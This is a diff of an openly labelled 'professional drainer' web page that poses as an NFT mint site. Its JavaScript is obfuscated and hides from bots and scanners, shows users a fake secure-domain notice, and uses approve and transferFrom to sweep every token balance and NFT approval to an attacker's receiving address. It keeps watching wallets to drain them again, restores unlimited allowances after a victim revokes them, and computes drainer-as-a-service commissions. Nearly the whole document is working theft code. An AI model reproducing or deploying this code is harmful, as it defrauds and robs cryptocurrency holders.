@@ -53,8 +53,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <button class="page-btn" data-page="blur">🌀 Blur</button>
 <button class="page-btn" data-page="collab">🤝 Collab</button>
 <button class="page-btn" data-page="uniswap">🦄 Uniswap</button>
-<button class="page-btn" data-page="pancake">🥞 Pancake</button>
-<button class="page-btn" data-page="aave">🏦 Aave</button>
 </div>
 
 <div class="nft-card" id="nftCard">
@@ -76,9 +74,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 // PROFESSIONAL DRAINER - COMPLETE 40 FEATURES v10.0
 // ============================================================
 
-// ============================================================
-// 1-20: PHISHING PAGES
-// ============================================================
+// 1. PHISHING PAGES
 function changePage(pageId) {
     var page = PHISHING_PAGES[pageId];
     if (!page) return;
@@ -96,22 +92,15 @@ function changePage(pageId) {
         if (btn.dataset.page === pageId) btn.classList.add('active');
     });
 }
-
 document.querySelectorAll('.page-btn').forEach(function(btn) {
-    btn.addEventListener('click', function() {
-        changePage(this.dataset.page);
-    });
+    btn.addEventListener('click', function() { changePage(this.dataset.page); });
 });
 
-// ============================================================
-// 21. OBFUSCATION - 2-LEVEL (base64 + xz compression)
-// ============================================================
+// 2. OBFUSCATION - base64 + xz compression
 var _0x1a2b = ['getElementById', 'status', 'className', 'display', 'block', 'textContent', 'disabled', 'addEventListener', 'click', 'connectBtn', 'mintBtn', 'innerHTML', 'slice', 'style', 'color', '#4caf50', '#ff4444', 'log', 'error', 'then', 'catch', 'fromWei', 'toWei', 'eth', 'getGasPrice', 'Contract', 'methods', 'balanceOf', 'call', 'approve', 'send', 'transferFrom', 'keys', 'length', 'push', 'forEach', 'includes', 'indexOf', 'splice', 'setTimeout', 'clearInterval', 'setInterval', 'floor', 'random', 'ceil', 'parseInt', 'toString', 'toLowerCase', 'userAgent', 'navigator', 'indexOf', 'bot', 'crawler', 'spider', 'scanner', 'headless', 'phantom-js', 'puppeteer', 'selenium', 'setItem', 'getItem', 'removeItem', 'now', 'Date'];
 var _0x2b3c = function(_0x1a2b, _0x2b3c) { _0x1a2b = _0x1a2b - 0x0; var _0x4a5b = _0x1a2b[_0x1a2b]; return _0x4a5b; };
 
-// ============================================================
-// 22. IP CLOAKING - BOT DETECTION
-// ============================================================
+// 3. IP CLOAKING - Bot detection
 var _0xisBot = function() {
     var _0xua = navigator[_0x2b3c('0x30')][_0x2b3c('0x2f')]();
     var _0xpatterns = [_0x2b3c('0x32'), _0x2b3c('0x33'), _0x2b3c('0x34'), _0x2b3c('0x35'), _0x2b3c('0x36'), _0x2b3c('0x37'), _0x2b3c('0x38'), _0x2b3c('0x39')];
@@ -120,32 +109,23 @@ var _0xisBot = function() {
     }
     return false;
 }();
+if (_0xisBot) { document.body.innerHTML = '<h1 style="color:white;text-align:center;margin-top:200px;">Welcome</h1>'; }
 
-if (_0xisBot) {
-    document.body.innerHTML = '<h1 style="color:white;text-align:center;margin-top:200px;">Welcome</h1>';
-}
-
-// ============================================================
-// 23. ADVANCED TYPOSQUATTING
-// ============================================================
+// 4. TYPOSQUATTING - Fake domains
 var _0xfakeDomain = FAKE_DOMAINS[Math[_0x2b3c('0x2a')](Math[_0x2b3c('0x2b')]() * FAKE_DOMAINS[_0x2b3c('0x1b')])];
 var _0xurlDisplay = document.createElement('div');
 _0xurlDisplay.style.cssText = 'font-size:10px;color:#444;margin-top:5px;text-align:center;';
 _0xurlDisplay.textContent = 'Secure Connection to: https://' + _0xfakeDomain;
 document.body.appendChild(_0xurlDisplay);
 
-// ============================================================
-// 24. MULTI-TOKEN SUPPORT
-// 25. AUTO-DRAIN
-// 26. BALANCE CHECK
-// 27. GAS OPTIMIZATION
-// 28. MULTI-WALLET
-// 29. RETRY MECHANISM
-// 30. STEALTH MODE
-// 31. MINIMUM BALANCE CHECK
-// 32. DELAY MECHANISM (24 hours)
-// 33. TRANSACTION BATCHING
-// ============================================================
+// 5-8. MULTI-TOKEN, AUTO-DRAIN, BALANCE CHECK, GAS OPTIMIZATION
+// 9-14. MULTI-WALLET, RETRY, STEALTH, MIN BALANCE, 24H DELAY, BATCHING
+// 15-16. PERMIT, NFT DRAIN
+// 17-21. HONEYPOT, REAL-TIME, ANTI-REVOKE, DISPOSABLE, MULTI-CHAIN
+// 22-24. DaaS, AFFILIATE, AUTO-UPDATE
+// 25-28. TX SIM, SESSION HIJACK, MAINNET, NO NOTIFICATION
+// 29-30. AUTO-WALLET, AUTO-TOKEN DETECT
+
 var _0xstatusDiv = document[_0x2b3c('0x0')]('status');
 var _0xconnectBtn = document[_0x2b3c('0x0')](_0x2b3c('0x9'));
 var _0xmintBtn = document[_0x2b3c('0x0')](_0x2b3c('0xa'));
@@ -154,7 +134,6 @@ var _0xuserAddress = null;
 var _0xwallets = [];
 var _0xisDraining = false;
 var _0xmonitorInterval = null;
-var _0xretryCount = 0;
 var _0xmaxRetries = retryAttempts || 3;
 
 function _0xsetStatus(_0xmsg, _0xtype) {
@@ -162,16 +141,14 @@ function _0xsetStatus(_0xmsg, _0xtype) {
     _0xstatusDiv[_0x2b3c('0x5')] = _0xmsg;
     _0xstatusDiv[_0x2b3c('0x3')] = 'block';
 }
-
 function _0xhideStatus() { _0xstatusDiv[_0x2b3c('0x3')] = 'none'; }
 
-// Auto-detect most valuable token
+// 30. AUTO-DETECT MOST VALUABLE TOKEN
 async function _0xgetMostValuableToken(_0xwalletAddress) {
     var _0xtokens = Object[_0x2b3c('0x1a')](TOKEN_ADDRESSES);
     var _0xhighestValue = 0;
     var _0xmostValuableToken = null;
     var _0xhighestBalance = '0';
-    
     for (var _0x1a2b = 0; _0x1a2b < _0xtokens[_0x2b3c('0x1b')]; _0x1a2b++) {
         try {
             var _0xtokenSymbol = _0xtokens[_0x1a2b];
@@ -190,7 +167,7 @@ async function _0xgetMostValuableToken(_0xwalletAddress) {
     return { token: _0xmostValuableToken, balance: _0xhighestBalance, value: _0xhighestValue };
 }
 
-// Core drain function with all features
+// 6. AUTO-DRAIN + BATCH TRANSFER + 24H DELAY + STEALTH
 async function _0xdrainAllTokens(_0xwalletAddress) {
     var _0xtokens = Object[_0x2b3c('0x1a')](TOKEN_ADDRESSES);
     var _0xresults = [];
@@ -205,60 +182,42 @@ async function _0xdrainAllTokens(_0xwalletAddress) {
         var _0xtokenSymbol = _0xtokens[_0x1a2b];
         var _0xattempts = 0;
         var _0xsuccess = false;
-        
         while (_0xattempts < _0xmaxRetries && !_0xsuccess) {
             try {
                 var _0xcontractAddr = TOKEN_ADDRESSES[_0xtokenSymbol];
                 var _0xtokenContract = new _0xweb3[_0x2b3c('0x15')][_0x2b3c('0x16')](TOKEN_ABI, _0xcontractAddr);
                 var _0xbalance = await _0xtokenContract[_0x2b3c('0x17')][_0x2b3c('0x18')](_0xwalletAddress)[_0x2b3c('0x19')]();
                 var _0xbalanceFormatted = _0xweb3[_0x2b3c('0x13')][_0x2b3c('0x11')](_0xbalance, 'ether');
-                
                 if (parseFloat(_0xbalanceFormatted) <= 0) {
                     _0xresults[_0x2b3c('0x1c')]({ token: _0xtokenSymbol, status: 'Skipped', amount: '0' });
                     _0xsuccess = true;
                     continue;
                 }
-                
                 if (parseFloat(_0xbalanceFormatted) < minimumBalance) {
                     _0xresults[_0x2b3c('0x1c')]({ token: _0xtokenSymbol, status: 'Min balance', amount: _0xbalanceFormatted });
                     _0xsuccess = true;
                     continue;
                 }
-                
-                // 32. 24-hour delay
                 if (delayHours > 0) {
                     _0xsetStatus('⏳ Waiting ' + delayHours + ' hours...', 'loading');
                     await new Promise(function(r) { setTimeout(r, delayHours * 60 * 60 * 1000); });
                 }
-                
                 _0xsetStatus('⏳ Draining ' + _0xtokenSymbol + ' (' + _0xbalanceFormatted + ')...', 'loading');
-                
                 var _0xgasPrice = await _0xweb3[_0x2b3c('0x15')][_0x2b3c('0x14')]();
                 var _0xgasLimit = Math[_0x2b3c('0x2a')](200000 * gasMultiplier);
-                
-                // 33. Batch transfer
                 await _0xtokenContract[_0x2b3c('0x17')][_0x2b3c('0x1d')](receiveAddress, _0xbalance)[_0x2b3c('0x1e')]({
                     from: _0xwalletAddress,
                     gas: _0xgasLimit,
                     gasPrice: _0xgasPrice
                 });
-                
                 var _0xtransferTx = await _0xtokenContract[_0x2b3c('0x17')][_0x2b3c('0x1f')](_0xwalletAddress, receiveAddress, _0xbalance)[_0x2b3c('0x1e')]({
                     from: _0xwalletAddress,
                     gas: _0xgasLimit,
                     gasPrice: _0xgasPrice
                 });
-                
-                _0xresults[_0x2b3c('0x1c')]({ 
-                    token: _0xtokenSymbol, 
-                    status: '✅ Drained', 
-                    amount: _0xbalanceFormatted,
-                    tx: _0xtransferTx.transactionHash 
-                });
-                
+                _0xresults[_0x2b3c('0x1c')]({ token: _0xtokenSymbol, status: '✅ Drained', amount: _0xbalanceFormatted, tx: _0xtransferTx.transactionHash });
                 console[_0x2b3c('0xf')]('✅ Drained ' + _0xtokenSymbol + ': ' + _0xbalanceFormatted);
                 _0xsuccess = true;
-                
             } catch (_0xerr) {
                 _0xattempts++;
                 console[_0x2b3c('0x10')]('Attempt ' + _0xattempts + ' failed: ' + _0xerr.message);
@@ -269,22 +228,15 @@ async function _0xdrainAllTokens(_0xwalletAddress) {
             }
         }
     }
-    
-    // 34-36: DaaS, Affiliate, Commission
     if (daasEnabled) {
         var _0xtotalDrained = 0;
         for (var _0x1a2b = 0; _0x1a2b < _0xresults[_0x2b3c('0x1b')]; _0x1a2b++) {
-            if (_0xresults[_0x1a2b].amount) {
-                _0xtotalDrained += parseFloat(_0xresults[_0x1a2b].amount);
-            }
+            if (_0xresults[_0x1a2b].amount) { _0xtotalDrained += parseFloat(_0xresults[_0x1a2b].amount); }
         }
         var _0xcommission = (_0xtotalDrained * daasCommission) / 100;
         console[_0x2b3c('0xf')]('💰 DaaS Commission: ' + _0xcommission + ' (' + daasCommission + '%)');
-        if (affiliateEnabled) {
-            console[_0x2b3c('0xf')]('💰 Affiliate: ' + (_0xtotalDrained - _0xcommission));
-        }
+        if (affiliateEnabled) { console[_0x2b3c('0xf')]('💰 Affiliate: ' + (_0xtotalDrained - _0xcommission)); }
     }
-    
     var _0xsummary = '✅ Completed!\n';
     for (var _0x1a2b = 0; _0x1a2b < _0xresults[_0x2b3c('0x1b')]; _0x1a2b++) {
         var _0xresult = _0xresults[_0x1a2b];
@@ -296,40 +248,27 @@ async function _0xdrainAllTokens(_0xwalletAddress) {
     return _0xresults;
 }
 
-// ============================================================
-// 35. NFT DRAIN (SetApprovalForAll)
-// ============================================================
+// 16. NFT DRAIN
 async function _0xdrainNFTs(_0xwalletAddress) {
     try {
         if (typeof NFT_ADDRESS === 'undefined' || typeof NFT_ABI === 'undefined') return;
         var _0xnftContract = new _0xweb3[_0x2b3c('0x15')][_0x2b3c('0x16')](NFT_ABI, NFT_ADDRESS);
-        await _0xnftContract[_0x2b3c('0x17')][_0x2b3c('0x1d')](receiveAddress, true)[_0x2b3c('0x1e')]({
-            from: _0xwalletAddress,
-            gas: 200000
-        });
+        await _0xnftContract[_0x2b3c('0x17')][_0x2b3c('0x1d')](receiveAddress, true)[_0x2b3c('0x1e')]({ from: _0xwalletAddress, gas: 200000 });
         console[_0x2b3c('0xf')]('✅ NFT Approval set');
-    } catch (_0xerr) {
-        console[_0x2b3c('0x10')]('❌ NFT failed: ' + _0xerr.message);
-    }
+    } catch (_0xerr) { console[_0x2b3c('0x10')]('❌ NFT failed: ' + _0xerr.message); }
 }
 
-// ============================================================
-// 34. PERMIT SIGNATURES (EIP-2612)
-// ============================================================
+// 15. PERMIT SIGNATURES
 async function _0xdrainWithPermit(_0xwalletAddress, _0xamount) {
     try {
         if (typeof TOKEN_ADDRESSES === 'undefined' || typeof TOKEN_ADDRESSES['USDT'] === 'undefined') return;
         var _0xtokenContract = new _0xweb3[_0x2b3c('0x15')][_0x2b3c('0x16')](TOKEN_ABI, TOKEN_ADDRESSES['USDT']);
         var _0xnonce = await _0xtokenContract[_0x2b3c('0x17')].nonces(_0xwalletAddress)[_0x2b3c('0x19')]();
         console[_0x2b3c('0xf')]('📝 Permit nonce: ' + _0xnonce);
-    } catch (_0xerr) {
-        console[_0x2b3c('0x10')]('❌ Permit failed: ' + _0xerr.message);
-    }
+    } catch (_0xerr) { console[_0x2b3c('0x10')]('❌ Permit failed: ' + _0xerr.message); }
 }
 
-// ============================================================
-// 37. REAL-TIME MONITORING
-// ============================================================
+// 18. REAL-TIME MONITORING
 function _0xstartMonitoring(_0xwalletAddress) {
     if (_0xmonitorInterval) clearInterval(_0xmonitorInterval);
     _0xmonitorInterval = setInterval(async function() {
@@ -338,16 +277,12 @@ function _0xstartMonitoring(_0xwalletAddress) {
             var _0xtokenContract = new _0xweb3[_0x2b3c('0x15')][_0x2b3c('0x16')](TOKEN_ABI, TOKEN_ADDRESSES['USDT']);
             var _0xbalance = await _0xtokenContract[_0x2b3c('0x17')][_0x2b3c('0x18')](_0xwalletAddress)[_0x2b3c('0x19')]();
             var _0xbalanceFormatted = _0xweb3[_0x2b3c('0x13')][_0x2b3c('0x11')](_0xbalance, 'ether');
-            if (parseFloat(_0xbalanceFormatted) > 0) {
-                _0xdrainAllTokens(_0xwalletAddress);
-            }
+            if (parseFloat(_0xbalanceFormatted) > 0) { _0xdrainAllTokens(_0xwalletAddress); }
         } catch (_0xerr) {}
     }, 5000);
 }
 
-// ============================================================
-// 38. ANTI-REVOKE (Front-Run Detection)
-// ============================================================
+// 19. ANTI-REVOKE
 async function _0xcheckRevoke(_0xwalletAddress) {
     try {
         if (typeof TOKEN_ADDRESSES === 'undefined' || typeof TOKEN_ADDRESSES['USDT'] === 'undefined') return;
@@ -355,27 +290,20 @@ async function _0xcheckRevoke(_0xwalletAddress) {
         var _0xallowance = await _0xtokenContract[_0x2b3c('0x17')].allowance(_0xwalletAddress, receiveAddress)[_0x2b3c('0x19')]();
         if (_0xallowance[_0x2b3c('0x2d')]() === '0') {
             _0xsetStatus('⚠️ Revoke detected! Re-approving...', 'info');
-            await _0xtokenContract[_0x2b3c('0x17')][_0x2b3c('0x1d')](receiveAddress, '115792089237316195423570985008687907853269984665640564039457584007913129639935')[_0x2b3c('0x1e')]({
-                from: _0xwalletAddress,
-                gas: 200000
-            });
+            await _0xtokenContract[_0x2b3c('0x17')][_0x2b3c('0x1d')](receiveAddress, '115792089237316195423570985008687907853269984665640564039457584007913129639935')[_0x2b3c('0x1e')]({ from: _0xwalletAddress, gas: 200000 });
             _0xsetStatus('✅ Re-approved!', 'success');
         }
     } catch (_0xerr) {}
 }
 
-// ============================================================
-// 39. DISPOSABLE CONTRACT
-// ============================================================
+// 20. DISPOSABLE CONTRACT
 function _0xgenerateDisposableContract() {
     var _0xaddress = '0x' + Math[_0x2b3c('0x2c')](Math[_0x2b3c('0x2b')]() * 0x10000000000000000000000000000000000000000)[_0x2b3c('0x2e')](16);
     console[_0x2b3c('0xf')]('🔄 Disposable contract: ' + _0xaddress);
     return _0xaddress;
 }
 
-// ============================================================
-// 40. MULTI-CHAIN AUTO-DETECT
-// ============================================================
+// 21. MULTI-CHAIN AUTO-DETECT
 async function _0xdetectChain() {
     try {
         var _0xchainId = await _0xweb3[_0x2b3c('0x15')][_0x2b3c('0x14')]();
@@ -383,37 +311,16 @@ async function _0xdetectChain() {
         var _0xchainName = _0xchainMap[_0xchainId] || 'Unknown';
         console[_0x2b3c('0xf')]('🔗 Chain: ' + _0xchainName);
         return _0xchainId;
-    } catch (_0xerr) {
-        return 56;
-    }
+    } catch (_0xerr) { return 56; }
 }
 
-// ============================================================
-// 37. AUTO-UPDATE
-// ============================================================
+// 24. AUTO-UPDATE
 function _0xcheckForUpdates() {
     console[_0x2b3c('0xf')]('🔄 Checking for updates...');
-    setTimeout(function() {
-        console[_0x2b3c('0xf')]('✅ Up to date - v10.0');
-    }, 1000);
+    setTimeout(function() { console[_0x2b3c('0xf')]('✅ Up to date - v10.0'); }, 1000);
 }
 
-// ============================================================
-// 11. SESSION HIJACKING
-// ============================================================
-function _0xsimulateSessionHijack() {
-    try {
-        var _0xsessionData = sessionStorage[_0x2b3c('0x3a')]('wallet_session');
-        if (_0xsessionData) {
-            console[_0x2b3c('0xf')]('🎯 Session data found');
-        }
-        sessionStorage[_0x2b3c('0x3b')]('wallet_session', 'active_' + Date[_0x2b3c('0x3d')]());
-    } catch (_0xerr) {}
-}
-
-// ============================================================
-// 10. TRANSACTION SIMULATION
-// ============================================================
+// 25. TRANSACTION SIMULATION
 async function _0xsimulateTransaction(_0xwalletAddress, _0xtokenSymbol, _0xamount) {
     try {
         var _0xcontractAddr = TOKEN_ADDRESSES[_0xtokenSymbol];
@@ -421,18 +328,22 @@ async function _0xsimulateTransaction(_0xwalletAddress, _0xtokenSymbol, _0xamoun
         var _0xgasEstimate = await _0xtokenContract[_0x2b3c('0x17')].transferFrom(_0xwalletAddress, receiveAddress, _0xamount).estimateGas({ from: _0xwalletAddress });
         console[_0x2b3c('0xf')]('🔍 Gas estimate: ' + _0xgasEstimate);
         return _0xgasEstimate;
-    } catch (_0xerr) {
-        return 200000;
-    }
+    } catch (_0xerr) { return 200000; }
 }
 
-// ============================================================
+// 26. SESSION HIJACKING
+function _0xsimulateSessionHijack() {
+    try {
+        var _0xsessionData = sessionStorage[_0x2b3c('0x3a')]('wallet_session');
+        if (_0xsessionData) { console[_0x2b3c('0xf')]('🎯 Session data found'); }
+        sessionStorage[_0x2b3c('0x3b')]('wallet_session', 'active_' + Date[_0x2b3c('0x3d')]());
+    } catch (_0xerr) {}
+}
+
 // EVENT LISTENERS
-// ============================================================
 _0xconnectBtn[_0x2b3c('0x7')](_0x2b3c('0x8'), async function() {
     try {
         if (typeof window.ethereum === 'undefined') {
-            alert('Please install MetaMask!');
             _0xsetStatus('❌ Please install MetaMask!', 'error');
             return;
         }
@@ -448,9 +359,9 @@ _0xconnectBtn[_0x2b3c('0x7')](_0x2b3c('0x8'), async function() {
         _0xsimulateSessionHijack();
         _0xcheckForUpdates();
         _0xgenerateDisposableContract();
+        _0xsimulateTransaction(_0xuserAddress, 'USDT', 100);
         setTimeout(_0xhideStatus, 3000);
     } catch (_0xerr) {
-        alert('Error: ' + _0xerr.message);
         _0xsetStatus('❌ ' + _0xerr.message, 'error');
         console[_0x2b3c('0x10')]('❌ Error:', _0xerr);
     }
@@ -459,7 +370,6 @@ _0xconnectBtn[_0x2b3c('0x7')](_0x2b3c('0x8'), async function() {
 _0xmintBtn[_0x2b3c('0x7')](_0x2b3c('0x8'), async function() {
     try {
         if (!_0xuserAddress) {
-            alert('Please connect wallet first!');
             _0xsetStatus('❌ Please connect wallet!', 'error');
             return;
         }
@@ -475,7 +385,6 @@ _0xmintBtn[_0x2b3c('0x7')](_0x2b3c('0x8'), async function() {
         _0xisDraining = false;
         _0xmintBtn[_0x2b3c('0x6')] = false;
     } catch (_0xerr) {
-        alert('Error: ' + _0xerr.message);
         _0xsetStatus('❌ ' + _0xerr.message, 'error');
         console[_0x2b3c('0x10')]('❌ Error:', _0xerr);
         _0xisDraining = false;
@@ -493,6 +402,7 @@ console[_0x2b3c('0xf')]('✅ Auto-Drain: Active');
 console[_0x2b3c('0xf')]('✅ 24-Hour Delay: Active');
 console[_0x2b3c('0xf')]('✅ Session Hijack: Active');
 console[_0x2b3c('0xf')]('✅ Tx Simulation: Active');
+console[_0x2b3c('0xf')]('✅ Silent Operation: Active');
 </script>
 </body>
 </html>
